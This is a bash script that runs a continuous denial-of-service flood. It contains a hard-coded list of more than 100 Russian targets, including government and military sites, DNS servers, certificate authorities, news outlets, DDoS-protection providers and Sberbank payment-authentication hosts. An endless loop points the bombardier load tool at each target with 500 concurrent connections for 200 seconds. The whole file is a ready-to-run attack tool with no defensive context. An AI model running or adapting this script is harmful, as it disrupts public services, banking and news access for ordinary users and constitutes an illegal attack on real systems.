#!/bin/bash -x

DESTS=(
    "https://www.astrobl.ru"
    "https://www.volgograd.ru"
    "https://www.admoblkaluga.ru"
    "https://apparat.lenobl.ru"
    "https://mosreg.ru"
    "https://orel-region.ru"
    "http://midural.ru"
    "http://www.tula.ru"
    "https://ulgov.ru"
    "https://cheladmin.ru"
    "https://krd.ru"
    "https://www.stavregion.ru"
    "http://213.24.76.25:8080"
    "http://213.24.76.25:1935"
    "http://195.218.193.189:5060"
    "http://95.173.148.51:5060"
    "http://95.173.148.51:554"
    "http://95.173.148.51:53"
    "http://95.173.148.50:53"
    "https://msk.rt.ru/"
    "http://lenta.ru"
    "http://duma.gov.ru/"
    "http://president-sovet.ru/"
    "https://sovetnational.ru/"
    "https://www.gosuslugi.ru/ru/"
    "https://zakupki.gov.ru/epz/main/public/home.html"
    "https://gossluzhba.gov.ru/"
    "http://defence.council.gov.ru/"
    "http://budget.council.gov.ru/"
    "http://www.kremlin.ru/"
    "https://government.ru/"
    "http://www.scrf.gov.ru/"
    "http://www.ksrf.ru/ru/Pages/default.aspx"
    "http://www.vsrf.ru/"
    "http://premier.gov.ru/events/"
    "https://www.mchs.gov.ru/"
    "https://minjust.gov.ru/ru/"
    "http://www.fsb.ru/"
    "https://rosguard.gov.ru/"
    "https://customs.gov.ru/"
    "https://udprf.ru/"
    "http://favt.gov.ru/"
    "http://194.67.2.109:53/UDP"
    "http://194.67.7.1:53/UDP"
    "http://194.54.14.187:53/UDP"
    "http://194.54.14.186:53/UDP"
    "https://iecp.ru/ep/ep-verification"
    "https://iecp.ru/ep/uc-list"
    "https://uc-osnovanie.ru/"
    "http://www.nucrf.ru"
    "http://www.belinfonalog.ru"
    "http://www.roseltorg.ru"
    "http://www.astralnalog.ru"
    "http://www.nwudc.ru"
    "http://www.center-inform.ru"
    "https://kk.bank/UdTs"
    "http://structure.mil.ru/structure/uc/info.htm"
    "http://www.ucpir.ru"
    "http://dreamkas.ru"
    "http://www.e-portal.ru"
    "http://izhtender.ru"
    "http://imctax.parus-s.ru"
    "http://www.icentr.ru"
    "http://www.kartoteka.ru"
    "http://rsbis.ru/elektronnaya-podpis"
    "http://www.stv-it.ru"
    "http://www.crypset.ru"
    "http://www.kt-69.ru"
    "http://www.24ecp.ru"
    "http://kraskript.com"
    "http://ca.ntssoft.ru"
    "http://www.y-center.ru"
    "http://www.rcarus.ru"
    "http://rk72.ru"
    "http://squaretrade.ru"
    "http://ca.gisca.ru"
    "http://www.otchet-online.ru"
    "http://udcs.ru"
    "http://www.cit-ufa.ru"
    "http://elkursk.ru"
    "http://www.icvibor.ru"
    "http://ucestp.ru"
    "http://mcspro.ru"
    "http://www.infotrust.ru"
    "http://epnow.ru"
    "http://ca.kamgov.ru"
    "http://mascom-it.ru"
    "http://cfmc.ru"
    "https://ddos-guard.net/ru"
    "https://stormwall.pro/"
    "https://qrator.net/ru/"
    "https://solidwall.ru/"
    "https://drom.ru"
    "https://novostinedeli24.com"
    "https://gazeta.ru"
    "https://citilink.ru"
    "https://pochta.ru"
    "https://kommersant.ru"
    "https://auto.drom.ru"
    "https://rg.ru"
    "https://vz.ru"
    "https://tass.ru"
    "https://scr.online.sberbank.ru/api/fl/idgib-w-3ds"
    "https://3dsec.sberbank.ru/mportal3/auth/login"
    "https://acs1.sbrf.ru"
    "https://acs2.sbrf.ru"
    "https://acs3.sbrf.ru"
    "https://acs4.sbrf.ru"
    "https://acs5.sbrf.ru"
    "https://acs6.sbrf.ru"
    "https://acs7.sbrf.ru"
    "https://acs8.sbrf.ru"
)

while true; do
    for DEST in ${DESTS[@]}; do
        sudo docker run -t --rm alpine/bombardier -c 500 -d 200s -l $DEST
        sleep 1
    done
done
